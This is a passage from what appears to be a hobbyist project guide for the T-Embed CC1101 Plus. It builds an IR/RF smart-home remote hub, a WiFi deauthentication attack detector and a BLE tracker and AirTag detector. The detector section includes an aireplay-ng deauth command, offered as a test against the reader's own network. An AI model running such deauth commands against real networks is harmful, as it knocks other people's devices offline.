- You will likely also receive TPMS signals from nearby vehicles in parking lots --- these will have unrecognized sensor IDs
- Pressure logs will show subtle variations correlated with temperature changes throughout the day (the ideal gas law in action)

{: .tip }
> TPMS data is an excellent real-world demonstration of the ideal gas law. Log pressure and temperature over a full day and you will see pressure rise as temperature increases. For every 10 degrees F change in temperature, tire pressure changes by approximately 1 psi.

### Extensions

- Build a "road trip mode" that logs TPMS data continuously during a long drive and graphs pressure vs. time
- Add support for multiple vehicle profiles (switch between your car, truck, motorcycle)
- Cross-reference with `rtl_433` output to validate your decoder against a known-good implementation
- Calculate tire health metrics (pressure consistency between tires, slow leak detection over days)
- Add GPS logging alongside TPMS data to correlate pressure changes with altitude and road conditions
- Display pressure delta from the recommended value (printed on driver door jamb sticker)

---

## Project 13: Smart Home IR + RF Hub
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

Your home is full of devices controlled by different remotes --- an IR remote for the TV, another for the soundbar, an RF remote for the smart plugs, another RF remote for the ceiling fan. This project unifies all of them into a single T-Embed hub with organized menus, room-based navigation, and powerful macros that orchestrate multiple devices at once.

The T-Embed CC1101 Plus is uniquely suited for this because it has both an IR blaster and a Sub-GHz radio. No other single device in this price range can control both IR and 433 MHz RF devices from one interface. You will capture every remote code in your home, organize them into a logical menu structure, and build macro sequences like "Movie Mode" that dims the RF-controlled lights, powers on the TV via IR, and switches the soundbar to the correct input --- all from a single button press.

This project stores all captured codes in the ESP32-S3's SPIFFS filesystem, so your entire smart home remote database lives permanently on the device, survives reboots, and can be backed up to a computer.

### What You'll Learn

- IR and RF signal capture, storage, and replay
- SPIFFS filesystem for persistent code storage on ESP32
- Menu system design for embedded displays
- Macro engine development (sequencing multiple commands)
- Timing and delay management between commands
- Combining multiple radio technologies in a single workflow

### Materials Needed

- T-Embed CC1101 Plus with antenna
- All your existing remote controls (IR and RF)
- Fresh batteries in all remotes
- Computer with Arduino IDE or PlatformIO
- USB-C cable for firmware flashing
- (Optional) Smartphone camera to verify IR LED activity

### Step-by-Step Instructions

**Step 1 --- Inventory and Capture All IR Codes**

Walk through every room and capture IR codes from every remote. Use the T-Embed's built-in IR capture:

```
Main Menu → IR → Read
```

For each device, capture and save all commonly used buttons. Use a consistent naming convention:

```
Format: [ROOM]_[DEVICE]_[BUTTON]

Examples:
  LIVING_TV_POWER
  LIVING_TV_VOLUP
  LIVING_TV_VOLDN
  LIVING_TV_MUTE
  LIVING_TV_INPUT
  LIVING_SOUND_POWER
  LIVING_SOUND_VOLUP
  LIVING_SOUND_MODE
  BED_AC_POWER
  BED_AC_TEMPUP
  BED_AC_TEMPDN
  BED_AC_FAN
```

{: .warning }
> Air conditioner remotes are the trickiest. Unlike TVs (which send single commands), AC remotes send the **entire state** of the system (temperature, mode, fan speed, swing) in every transmission. Capture each distinct state you use rather than individual button presses.

**Step 2 --- Inventory and Capture All RF Codes**

Switch to Sub-GHz capture for your 433 MHz devices:

```
Main Menu → RF → Sub-GHz → Read
Frequency: 433.92 MHz
Modulation: AM (OOK)
```

Capture codes from all your RF-controlled devices:

```
  LIVING_PLUG1_ON
  LIVING_PLUG1_OFF
  LIVING_PLUG2_ON
  LIVING_PLUG2_OFF
  BED_FAN_POWER
  BED_FAN_SPEED
  PATIO_LIGHTS_ON
  PATIO_LIGHTS_OFF
```

Verify each captured code by replaying it and confirming the device responds.

**Step 3 --- Design the SPIFFS Storage Schema**

Organize all captured codes in a structured filesystem:

```c
// SPIFFS file structure
// /codes/ir/[room]/[device]/[button].json
// /codes/rf/[room]/[device]/[button].json
// /macros/[macro_name].json

// IR code storage format
// /codes/ir/living/tv/power.json
{
    "type": "ir",
    "protocol": "NEC",
    "address": "0x04",
    "command": "0x08",
    "raw": null
}

// RF code storage format
// /codes/rf/living/plug1/on.json
{
    "type": "rf",
    "frequency": 433920000,
    "modulation": "OOK",
    "data": "AAB3AC4D",
    "bit_length": 24,
    "repeat": 4
}
```

Implement the storage system:

```c
#include <SPIFFS.h>
#include <ArduinoJson.h>

bool saveCode(const char* path, JsonDocument& doc) {
    File f = SPIFFS.open(path, FILE_WRITE);
    if (!f) return false;
    serializeJson(doc, f);
    f.close();
    return true;
}

bool loadCode(const char* path, JsonDocument& doc) {
    File f = SPIFFS.open(path, FILE_READ);
    if (!f) return false;
    deserializeJson(doc, f);
    f.close();
    return true;
}

// List all devices in a room
void listDevices(const char* room, const char* type) {
    String base = String("/codes/") + type + "/" + room;
    File dir = SPIFFS.open(base);
    File entry;
    while (entry = dir.openNextFile()) {
        Serial.println(entry.name());
    }
}
```

**Step 4 --- Build the Room-Based Menu System**

Design a hierarchical menu that mirrors how you think about your home:

```c
typedef enum {
    MENU_HOME,
    MENU_ROOM,
    MENU_DEVICE,
    MENU_BUTTONS,
    MENU_MACROS
} MenuLevel;

typedef struct {
    const char* label;
    const char* path;       // SPIFFS path to code file
    bool is_ir;             // true = IR, false = RF
} ButtonEntry;

typedef struct {
    const char* label;
    ButtonEntry* buttons;
    uint8_t button_count;
} DeviceEntry;

typedef struct {
    const char* label;
    DeviceEntry* devices;
    uint8_t device_count;
} RoomEntry;

// Build your home layout
RoomEntry rooms[] = {
    {"Living Room", living_devices, 4},  // TV, Soundbar, Plug 1, Plug 2
    {"Bedroom",     bedroom_devices, 3},  // AC, Fan, Lamp
    {"Kitchen",     kitchen_devices, 2},  // Light, Radio
    {"Patio",       patio_devices, 1},    // String Lights
};
```

Render the menu on the TFT with the rotary encoder for navigation:

```
┌──────────────────────────────────┐
│      Smart Home Hub v1.0        │
│──────────────────────────────────│
│                                  │
│   ► Living Room                  │
│     Bedroom                      │
│     Kitchen                      │
│     Patio                        │
│   ─────────────                  │
│     Macros                       │
│                                  │
│──────────────────────────────────│
│  [ROTATE] Navigate  [PRESS] Go  │
└──────────────────────────────────┘

     ↓ Select "Living Room" ↓

┌──────────────────────────────────┐
│      Living Room                 │
│──────────────────────────────────│
│                                  │
│   ► TV             (IR)         │
│     Soundbar       (IR)         │
│     Smart Plug 1   (RF)         │
│     Smart Plug 2   (RF)         │
│                                  │
│──────────────────────────────────│
│  [ROTATE] Nav  [PRESS] Select   │
│  [LONG] Back                     │
└──────────────────────────────────┘
```

**Step 5 --- Build the Macro Engine**

Macros are sequences of IR and RF commands with configurable delays between them:

```c
typedef struct {
    const char* code_path;  // SPIFFS path to the code
    bool is_ir;             // IR or RF
    uint16_t delay_ms;      // Delay AFTER this command
} MacroStep;

typedef struct {
    const char* name;
    MacroStep* steps;
    uint8_t step_count;
} Macro;

// "Movie Mode" macro
MacroStep movie_mode_steps[] = {
    {"/codes/rf/living/plug1/off.json",     false, 500},  // Dim lights
    {"/codes/rf/living/plug2/off.json",     false, 500},  // Dim more lights
    {"/codes/ir/living/tv/power.json",      true,  2000}, // TV on (wait for boot)
    {"/codes/ir/living/tv/input.json",      true,  500},  // Switch to HDMI
    {"/codes/ir/living/sound/power.json",   true,  1000}, // Soundbar on
    {"/codes/ir/living/sound/mode.json",    true,  0},    // Set to movie mode
};

Macro macros[] = {
    {"Movie Mode",    movie_mode_steps, 6},
    {"Good Morning",  morning_steps,    4},
    {"Good Night",    night_steps,      5},
    {"Leave Home",    leave_steps,      3},
};

void executeMacro(Macro* macro) {
    for (int i = 0; i < macro->step_count; i++) {
        // Load code from SPIFFS
        JsonDocument doc;
        loadCode(macro->steps[i].code_path, doc);

        // Send via appropriate radio
        if (macro->steps[i].is_ir) {
            sendIRCode(doc);
        } else {
            sendRFCode(doc);
        }

        // Show progress on screen
        drawProgress(macro->name, i + 1, macro->step_count);

        // Wait before next command
        delay(macro->steps[i].delay_ms);
    }
    drawComplete(macro->name);
}
```

**Step 6 --- Add a Capture-and-Store Workflow**

Build a guided capture mode that walks you through adding new devices:

```
┌──────────────────────────────────┐
│      Add New Device              │
│──────────────────────────────────│
│                                  │
│  Room: Living Room               │
│  Device: Projector               │
│  Type: IR                        │
│                                  │
│  Now capturing: POWER            │
│                                  │
│  Point remote at T-Embed         │
│  and press the button...         │
│                                  │
│       [ Waiting for signal ]     │
│                                  │
│──────────────────────────────────│
│  [PRESS] Skip  [LONG] Done      │
└──────────────────────────────────┘
```

### Expected Results

- A fully organized, room-based smart home controller on a single device
- Reliable IR control of all captured devices (95%+ success rate at normal room distances)
- Reliable RF control of 433 MHz devices (range dependent on antenna and obstructions)
- Macros that execute multi-step sequences with proper timing between commands
- All codes persist across reboots via SPIFFS storage
- SPIFFS usage of approximately 100--500 KB for a typical home (well within the ESP32-S3's partition)

{: .tip }
> Start with your most-used room first. Get that room fully working --- all devices captured, menu navigation smooth, one macro operational --- before expanding to other rooms. A working single-room controller is immediately useful, and you can add rooms incrementally.

### Extensions

- Add a "quick fire" mode where the rotary encoder scrolls through your most-used commands without navigating menus
- Build a web interface (ESP32 in AP mode) for editing macros and managing codes from your phone
- Implement scheduling (turn on patio lights at sunset, turn off bedroom TV at midnight)
- Add voice feedback using the T-Embed's speaker (beeps for confirmation, tones for errors)
- Export and import code libraries as JSON files for backup and sharing
- Create "scene" buttons on the main screen for one-tap access to your top 4 macros

---

## Project 14: WiFi Deauthentication Detector and Alert System
{: .d-inline-block }

Advanced
{: .label .label-purple }

### Overview

A deauthentication attack is one of the most common WiFi attacks in the wild. The attacker sends forged management frames that tell your devices to disconnect from the network. It is trivially easy to execute (dozens of tools exist), it works against any WPA2 network without Protected Management Frames (PMF), and it is nearly impossible to detect without dedicated monitoring equipment. This project turns your T-Embed into that monitoring equipment.

You will build a passive WiFi monitoring station that listens for deauthentication and disassociation frames in real time. The ESP32-S3's WiFi radio supports promiscuous mode, which allows it to capture all WiFi frames on a channel --- including management frames that are normally invisible to connected devices. When the detector sees deauth frames, it sounds an audible alarm, displays attack details on the TFT, and logs everything with timestamps.

This is a purely defensive tool. You are monitoring your own network for attacks. You never transmit anything, never connect to anyone else's network, and never interfere with any wireless communication. You are building a burglar alarm for your WiFi.

### What You'll Learn

- IEEE 802.11 frame types and subtypes (management, control, data)
- WiFi promiscuous mode on the ESP32-S3
- Deauthentication and disassociation frame structure
- Real-time packet analysis and filtering
- Alert system design with audible and visual feedback
- Security event logging and analysis

### Materials Needed

- T-Embed CC1101 Plus
- Your home WiFi network (for testing and monitoring)
- Computer with Arduino IDE or PlatformIO
- USB-C cable for firmware flashing
- (Optional) A second device to generate test deauth frames on your own network

{: .danger }
> **This tool monitors YOUR network for attacks against it.** Do not use this to monitor networks you do not own. Do not generate deauthentication frames against networks you do not own. Sending deauth frames to a network without authorization is illegal under the CFAA and may violate FCC regulations regarding intentional interference.

### Step-by-Step Instructions

**Step 1 --- Understand 802.11 Frame Structure**

WiFi management frames follow the IEEE 802.11 standard. The frames you care about for this project are:

| Frame Type | Subtype | Hex Code | Purpose |
|:-----------|:--------|:---------|:--------|
| Management | Deauthentication | 0x00C0 | Forces client to disconnect |
| Management | Disassociation | 0x00A0 | Forces client to disassociate |
| Management | Authentication | 0x00B0 | Legitimate auth (for comparison) |
| Management | Beacon | 0x0080 | AP announces its presence |

A deauthentication frame has this structure:

```
┌─────────────┬──────────┬──────────┬──────────┬──────────┬────────────┬──────────┐
│ Frame Ctrl  │ Duration │ Dest MAC │ Src MAC  │ BSSID    │ Seq Ctrl   │ Reason   │
│ 2 bytes     │ 2 bytes  │ 6 bytes  │ 6 bytes  │ 6 bytes  │ 2 bytes    │ 2 bytes  │
└─────────────┴──────────┴──────────┴──────────┴──────────┴────────────┴──────────┘

Frame Control byte 1: 0xC0 (type=0, subtype=0xC = deauth)
Reason codes:
  1 = Unspecified
  2 = Previous auth no longer valid
  3 = Station leaving BSS
  6 = Class 2 frame from non-authenticated station
  7 = Class 3 frame from non-associated station
```

**Step 2 --- Configure ESP32-S3 Promiscuous Mode**

The ESP32-S3 WiFi stack supports promiscuous mode, which captures all frames on a channel without being associated to any network:

```c
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <TFT_eSPI.h>

// Deauth frame detection counters
volatile uint32_t deauth_count = 0;
volatile uint32_t disassoc_count = 0;
volatile uint32_t total_mgmt_frames = 0;
volatile uint32_t attack_start_time = 0;
volatile bool attack_active = false;

// Attack tracking
typedef struct {
    uint8_t bssid[6];          // Target network
    uint8_t attacker_mac[6];   // Source of deauth frames
    uint32_t frame_count;      // Number of deauth frames
    uint32_t first_seen;       // First detection timestamp
    uint32_t last_seen;        // Most recent detection
} AttackRecord;

#define MAX_ATTACKS 16
AttackRecord attacks[MAX_ATTACKS];
uint8_t attack_count = 0;

// WiFi packet callback
void IRAM_ATTR wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;  // Only management frames

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    uint16_t frame_ctrl = frame[0] | (frame[1] << 8);
    uint8_t frame_type = (frame_ctrl & 0x0C) >> 2;
    uint8_t frame_subtype = (frame_ctrl & 0xF0) >> 4;

    total_mgmt_frames++;

    // Check for deauthentication (subtype 0x0C)
    // or disassociation (subtype 0x0A)
    if (frame_subtype == 0x0C || frame_subtype == 0x0A) {
        if (frame_subtype == 0x0C) deauth_count++;
        else disassoc_count++;

        // Extract MACs from the frame
        const uint8_t* dest_mac = &frame[4];    // Destination
        const uint8_t* src_mac  = &frame[10];   // Source
        const uint8_t* bssid    = &frame[16];   // BSSID

        // Extract reason code
        uint16_t reason = frame[24] | (frame[25] << 8);

        // Record this attack
        recordAttack(bssid, src_mac, reason);
    }
}
```

**Step 3 --- Implement Channel Hopping**

Deauth attacks can target any channel. To monitor all of them, implement channel hopping:

```c
#define CHANNEL_HOP_INTERVAL_MS  200  // Dwell time per channel
#define MAX_CHANNEL              13   // Channels 1-13 (region dependent)

uint8_t current_channel = 1;
uint32_t last_hop_time = 0;

// In your setup:
void setupPromiscuous() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();

    // Enable promiscuous mode with management frame filter
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

// In your loop:
void hopChannel() {
    if (millis() - last_hop_time > CHANNEL_HOP_INTERVAL_MS) {
        current_channel++;
        if (current_channel > MAX_CHANNEL) current_channel = 1;

        // If attack detected, stay on attack channel longer
        if (attack_active) {
            // Spend 80% of time on attack channel
            // 20% scanning others
        }

        esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
        last_hop_time = millis();
    }
}
```

{: .tip }
> When an attack is detected, stop hopping and lock onto the active channel. This lets you capture every deauth frame and accurately measure the attack intensity. Resume hopping only after 10 seconds of no deauth frames on the locked channel.

**Step 4 --- Build the Alert Display**

Design a real-time attack dashboard on the TFT:

```c
void drawDashboard() {
    tft.fillScreen(TFT_BLACK);

    if (!attack_active) {
        // Normal monitoring display
        tft.setTextColor(TFT_GREEN);
        tft.drawString("MONITORING", 60, 10, 4);
        tft.setTextColor(TFT_WHITE);
        tft.drawString("Channel: " + String(current_channel), 10, 50, 2);
        tft.drawString("Mgmt frames: " + String(total_mgmt_frames), 10, 70, 2);
        tft.drawString("Status: No threats", 10, 100, 2);
        tft.drawString("Uptime: " + formatUptime(), 10, 130, 2);
    } else {
        // ATTACK DETECTED display
        tft.fillScreen(TFT_RED);
        tft.setTextColor(TFT_WHITE);
        tft.drawString("DEAUTH ATTACK", 30, 10, 4);
        tft.drawString("DETECTED", 70, 35, 4);

        // Attack details
        tft.drawString("Target: " + formatMAC(attacks[0].bssid), 10, 70, 2);
        tft.drawString("Source: " + formatMAC(attacks[0].attacker_mac), 10, 90, 2);
        tft.drawString("Frames: " + String(deauth_count), 10, 110, 2);
        tft.drawString("Rate: " + String(getFramesPerSecond()) + " f/s", 10, 130, 2);
        tft.drawString("Channel: " + String(current_channel), 10, 150, 2);
    }
}
```

Display layout during an active attack:

```
┌──────────────────────────────────┐
│  ██ DEAUTH ATTACK DETECTED ██   │
│──────────────────────────────────│
│                                  │
│  Target BSSID: AA:BB:CC:DD:EE:FF│
│  Attacker MAC: 11:22:33:44:55:66│
│  Channel:      6                 │
│  Frames:       1,247             │
│  Rate:         85 frames/sec     │
│  Duration:     14 seconds        │
│  Reason code:  7 (Class 3)      │
│                                  │
│──────────────────────────────────│
│  ▂▃▅▇█▇█████▇▅▃▃▅▇███▇▅▂▁▁▁▁   │
│  └─ Frame rate over time ──────┘ │
└──────────────────────────────────┘
```

**Step 5 --- Add Audible Alarm**

Use the T-Embed's onboard speaker for attack alerts:

```c
#define SPEAKER_PIN  46  // T-Embed CC1101 Plus speaker pin

void setupSpeaker() {
    ledcSetup(0, 2000, 8);    // Channel 0, 2kHz, 8-bit
    ledcAttachPin(SPEAKER_PIN, 0);
}

void playAlarmTone() {
    // Ascending warning tone
    for (int freq = 1000; freq <= 3000; freq += 200) {
        ledcWriteTone(0, freq);
        delay(50);
    }
    ledcWriteTone(0, 0);  // Silence
}

void playUrgentAlarm() {
    // Rapid alternating tone for active attack
    for (int i = 0; i < 5; i++) {
        ledcWriteTone(0, 2800);
        delay(100);
        ledcWriteTone(0, 1400);
        delay(100);
    }
    ledcWriteTone(0, 0);
}

// In your main loop, modulate alarm intensity by attack rate
void updateAlarm() {
    uint32_t fps = getFramesPerSecond();
    if (fps > 50) {
        playUrgentAlarm();       // Heavy attack
    } else if (fps > 10) {
        playAlarmTone();         // Moderate attack
    } else if (fps > 0) {
        ledcWriteTone(0, 1500);  // Light warning beep
        delay(50);
        ledcWriteTone(0, 0);
    }
}
```

**Step 6 --- Implement Event Logging**

Log all detected attacks with full detail for post-incident analysis:

```c
void logAttackEvent(AttackRecord* attack, uint16_t reason) {
    File f = SPIFFS.open("/deauth_log.csv", FILE_APPEND);
    if (!f) return;

    // Format: timestamp, channel, target_bssid, attacker_mac,
    //         frame_count, reason_code, frames_per_second
    f.printf("%lu,%d,%s,%s,%lu,%d,%.1f\n",
        millis(),
        current_channel,
        formatMAC(attack->bssid).c_str(),
        formatMAC(attack->attacker_mac).c_str(),
        attack->frame_count,
        reason,
        getFramesPerSecond()
    );
    f.close();
}

// Calculate attack intensity
float getFramesPerSecond() {
    if (!attack_active) return 0;
    uint32_t duration_ms = millis() - attack_start_time;
    if (duration_ms == 0) return 0;
    return (float)deauth_count / (duration_ms / 1000.0);
}
```

**Step 7 --- Test with Your Own Network**

Validate your detector by generating test deauth frames against your own network. Use a second ESP32 or a laptop with `aireplay-ng`:

```bash
# On a Linux laptop with a monitor-mode capable WiFi adapter
# Target YOUR OWN network only
sudo airmon-ng start wlan0
sudo aireplay-ng --deauth 10 -a [YOUR_BSSID] wlan0mon
```

Verify that your detector:
1. Detects the deauth frames within 1--2 seconds (channel hop latency)
2. Correctly identifies the target BSSID as your network
3. Displays the attacker's MAC address
4. Sounds the alarm
5. Logs the event with correct details
6. Shows accurate frame count and rate

### Expected Results

- The detector will identify deauth frames within 200--2000 ms depending on channel hop timing
- Frame rate measurement will accurately reflect the attack intensity
- You will discover that your WPA2 network (without PMF) is completely vulnerable to deauth --- this is expected and normal for most home networks
- The alarm will trigger reliably on attacks exceeding 5 frames per second
- Log files will provide forensic data for understanding attack patterns
- During normal operation (no attack), the detector will show zero deauth frames --- legitimate disconnections use different frame sequences

{: .tip }
> After confirming your network is vulnerable to deauth, enable WPA3 or WPA2 with Protected Management Frames (PMF/802.11w) on your router. Then test again --- the deauth frames will still be sent, but your devices will ignore them. The detector will still see the frames, which means it can alert you that someone is attempting an attack even if the attack is ineffective.

### Extensions

- Add email or webhook notifications when an attack is detected (via WiFi, when not under active deauth)
- Build historical attack graphs showing frequency and intensity over weeks
- Implement MAC address vendor lookup (OUI database) to identify the attacker's device manufacturer
- Add a "canary" mode that deliberately connects a secondary device to your network and monitors for disconnection
- Cross-reference deauth detection with Sub-GHz RF jamming detection for comprehensive wireless threat monitoring
- Deploy multiple detectors on different channels to eliminate the hop latency entirely

---

## Project 15: BLE Asset Tracker and Proximity Alert System
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

You carry a constellation of BLE devices everywhere you go --- phone, smartwatch, wireless earbuds, fitness tracker, laptop. Each one constantly broadcasts BLE advertisement packets. This project builds a personal asset tracking system that monitors your known devices, estimates their proximity using signal strength, and alerts you when something appears or disappears. It also watches for unknown BLE beacons entering your space, which can indicate tracking devices like AirTags that someone may have placed near you.

The T-Embed becomes a stationary BLE sentinel. Place it at your desk, in your workshop, or by your front door. It continuously scans for BLE advertisements, maintains a whitelist of your personal devices, tracks their RSSI (Received Signal Strength Indicator) for proximity estimation, and lights up the display with a real-time device dashboard showing what is near, what is far, and what is missing.

The proximity estimation uses the log-distance path loss model, which converts RSSI values to approximate distances. It is not GPS-accurate --- BLE signal strength fluctuates with obstructions, reflections, and interference --- but it reliably distinguishes between "in the same room," "nearby," and "out of range."

### What You'll Learn

- BLE advertisement scanning with the NimBLE library
- RSSI-based proximity estimation using the path loss model
- Device fingerprinting by manufacturer data and service UUIDs
- AirTag and tracker detection techniques
- Real-time dashboard rendering on embedded displays
- Event-driven alert systems with configurable thresholds

### Materials Needed

- T-Embed CC1101 Plus
- Your personal BLE devices (phone, watch, earbuds, etc.)
- Computer with Arduino IDE or PlatformIO
- USB-C cable for firmware flashing
- (Optional) AirTag or Tile tracker for testing unknown device detection
- (Optional) External battery for portable deployment

### Step-by-Step Instructions

**Step 1 --- Set Up the NimBLE Scanner**

The NimBLE library is the preferred BLE stack for ESP32-S3 --- it uses less RAM than the default Bluedroid stack and supports all the scanning features you need:

```c
#include <NimBLEDevice.h>
#include <TFT_eSPI.h>

// Known device database
typedef struct {
    char name[32];              // Human-readable name
    uint8_t mac[6];             // MAC address (if static)
    uint16_t manufacturer_id;   // Company ID from advertisement
    bool use_mac;               // Match by MAC or manufacturer data
    int8_t rssi;                // Latest RSSI reading
    int8_t rssi_avg;            // Smoothed RSSI (rolling average)
    float distance_m;           // Estimated distance in meters
    uint32_t last_seen;         // millis() timestamp
    bool present;               // Currently in range
    bool was_present;           // Was in range last check
} TrackedDevice;

#define MAX_TRACKED 10
TrackedDevice whitelist[MAX_TRACKED];
uint8_t whitelist_count = 0;

// Unknown device tracking
typedef struct {
    uint8_t mac[6];
    int8_t rssi;
    uint32_t first_seen;
    uint32_t last_seen;
    uint32_t seen_count;
    uint16_t manufacturer_id;
    bool is_apple_findmy;       // Potential AirTag
    bool alerted;               // Already triggered alert
} UnknownDevice;

#define MAX_UNKNOWN 50
UnknownDevice unknowns[MAX_UNKNOWN];
uint8_t unknown_count = 0;
```

**Step 2 --- Configure Your Device Whitelist**

Add your personal devices. You need to identify each device's BLE advertisement characteristics:

```c
void setupWhitelist() {
    // iPhone — uses Apple manufacturer ID (0x004C)
    // Note: iPhones rotate MAC addresses, so match by manufacturer data
    addWhitelistDevice("iPhone", NULL, 0x004C, false);

    // Apple Watch — also uses Apple manufacturer ID
    // Distinguish from iPhone by service UUIDs or proximity
    addWhitelistDevice("Apple Watch", NULL, 0x004C, false);

    // Wireless earbuds — may use a static MAC
    uint8_t earbuds_mac[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
    addWhitelistDevice("Galaxy Buds", earbuds_mac, 0x0075, true);

    // Fitness tracker
    uint8_t fitbit_mac[] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
    addWhitelistDevice("Fitbit", fitbit_mac, 0x0000, true);

    // Laptop (if BLE enabled)
    addWhitelistDevice("MacBook", NULL, 0x004C, false);
}

void addWhitelistDevice(const char* name, uint8_t* mac,
                         uint16_t mfr_id, bool use_mac) {
    TrackedDevice* dev = &whitelist[whitelist_count++];
    strncpy(dev->name, name, 31);
    if (mac) memcpy(dev->mac, mac, 6);
    dev->manufacturer_id = mfr_id;
    dev->use_mac = use_mac;
    dev->present = false;
    dev->was_present = false;
    dev->rssi = -127;  // Unknown
}
```

{: .tip }
> To find your device's MAC address and manufacturer ID, run a BLE scan first and look for your devices in the results. Most non-Apple devices use static MAC addresses that you can add directly to the whitelist. Apple devices rotate their MAC addresses, so you will need to match on manufacturer data patterns instead.

**Step 3 --- Implement the BLE Scan Callback**

Process each advertisement as it arrives:

```c
class ScanCallbacks : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* device) override {
        uint8_t* adv_mac = (uint8_t*)device->getAddress().getNative();
        int8_t rssi = device->getRSSI();
        uint16_t mfr_id = 0;

        // Extract manufacturer ID if present
        if (device->haveManufacturerData()) {
            std::string mfr_data = device->getManufacturerData();
            if (mfr_data.length() >= 2) {
                mfr_id = mfr_data[0] | (mfr_data[1] << 8);
            }
        }

        // Check against whitelist
        bool matched = false;
        for (int i = 0; i < whitelist_count; i++) {
            if (matchesDevice(&whitelist[i], adv_mac, mfr_id)) {
                updateTrackedDevice(&whitelist[i], rssi);
                matched = true;
                break;
            }
        }

        // If not whitelisted, track as unknown
        if (!matched) {
            trackUnknownDevice(adv_mac, rssi, mfr_id, device);
        }
    }
};

void updateTrackedDevice(TrackedDevice* dev, int8_t rssi) {
    dev->rssi = rssi;
    // Exponential moving average for smoothing
    dev->rssi_avg = (dev->rssi_avg * 7 + rssi) / 8;
    dev->distance_m = rssiToDistance(dev->rssi_avg);
    dev->last_seen = millis();
    dev->was_present = dev->present;
    dev->present = true;
}
```

**Step 4 --- Implement RSSI-to-Distance Estimation**

The log-distance path loss model converts RSSI to approximate distance:

```c
// Log-distance path loss model:
// RSSI = RSSI_ref - 10 * n * log10(d / d_ref)
//
// Where:
//   RSSI_ref = RSSI at reference distance (1 meter), typically -59 to -65 dBm
//   n = path loss exponent (2.0 free space, 2.5-4.0 indoors)
//   d = distance in meters
//   d_ref = reference distance (1 meter)

#define RSSI_AT_1M   -59.0   // Calibrate for your devices
#define PATH_LOSS_N   2.5    // Indoor environment

float rssiToDistance(int8_t rssi) {
    if (rssi == 0 || rssi == -127) return -1.0;  // Unknown

    float exponent = (RSSI_AT_1M - (float)rssi) / (10.0 * PATH_LOSS_N);
    float distance = pow(10.0, exponent);

    // Clamp to reasonable range
    if (distance < 0.1) distance = 0.1;
    if (distance > 30.0) distance = 30.0;

    return distance;
}

// Convert distance to human-readable proximity zone
const char* distanceToZone(float distance_m) {
    if (distance_m < 0) return "Unknown";
    if (distance_m < 1.0) return "Immediate";   // On your person
    if (distance_m < 3.0) return "Near";         // Same desk/table
    if (distance_m < 8.0) return "Room";         // Same room
    if (distance_m < 15.0) return "Far";         // Adjacent room
    return "Edge";                                // At range limit
}
```

{: .warning }
> RSSI-based distance estimation is inherently imprecise. Walls, furniture, human bodies, and other obstacles absorb and reflect BLE signals unpredictably. Expect accuracy of plus or minus 2--3 meters indoors. Use the proximity zones (Immediate/Near/Room/Far) rather than exact meter readings for practical decision-making.

**Step 5 --- Detect Unknown Trackers (AirTag Detection)**

Apple AirTags and similar trackers broadcast specific BLE advertisement patterns. Detect them by watching for persistent unknown Apple devices:

```c
void trackUnknownDevice(uint8_t* mac, int8_t rssi,
                         uint16_t mfr_id,
                         const NimBLEAdvertisedDevice* device) {
    // Check if we already track this device
    int idx = findUnknown(mac);
    if (idx >= 0) {
        unknowns[idx].rssi = rssi;
        unknowns[idx].last_seen = millis();
        unknowns[idx].seen_count++;

        // AirTag detection heuristic:
        // Apple manufacturer ID + seen consistently for 15+ minutes
        // + not in our whitelist = potential tracker
        uint32_t duration = millis() - unknowns[idx].first_seen;
        if (mfr_id == 0x004C && duration > 900000 && // 15 minutes
            unknowns[idx].seen_count > 50 &&
            !unknowns[idx].alerted) {
            triggerTrackerAlert(&unknowns[idx]);
            unknowns[idx].alerted = true;
        }
    } else {
        // New unknown device
        if (unknown_count < MAX_UNKNOWN) {
            UnknownDevice* u = &unknowns[unknown_count++];
            memcpy(u->mac, mac, 6);
            u->rssi = rssi;
            u->first_seen = millis();
            u->last_seen = millis();
            u->seen_count = 1;
            u->manufacturer_id = mfr_id;
            u->is_apple_findmy = (mfr_id == 0x004C);
            u->alerted = false;
        }
    }
}

void triggerTrackerAlert(UnknownDevice* device) {
    // Visual alert
    tft.fillScreen(TFT_ORANGE);
    tft.setTextColor(TFT_BLACK);
    tft.drawString("UNKNOWN TRACKER", 20, 20, 4);
    tft.drawString("DETECTED", 60, 50, 4);
    tft.drawString("MAC: " + formatMAC(device->mac), 10, 90, 2);
    tft.drawString("RSSI: " + String(device->rssi) + " dBm", 10, 110, 2);
    tft.drawString("Duration: " +
        String((millis() - device->first_seen) / 60000) + " min", 10, 130, 2);

    // Audible alert
    playAlertSequence();
}
```

**Step 6 --- Build the Device Status Dashboard**

Create a clean real-time display showing all tracked devices:

```c
void drawDashboard() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_CYAN);
    tft.drawString("BLE Asset Tracker", 40, 5, 2);

    int y = 30;
    for (int i = 0; i < whitelist_count; i++) {
        TrackedDevice* dev = &whitelist[i];
        uint32_t age = millis() - dev->last_seen;

        // Status color
        uint16_t color;
        const char* status;
        if (age > 60000) {
            color = TFT_RED;
            status = "LOST";
            dev->present = false;
        } else if (age > 15000) {
            color = TFT_YELLOW;
            status = "Fading";
        } else {
            color = TFT_GREEN;
            status = distanceToZone(dev->distance_m);
        }

        tft.setTextColor(color);
        tft.drawString(dev->name, 10, y, 2);

        tft.setTextColor(TFT_WHITE);
        char info[64];
        snprintf(info, sizeof(info), "%s  %.1fm  %ddBm",
                 status, dev->distance_m, dev->rssi_avg);
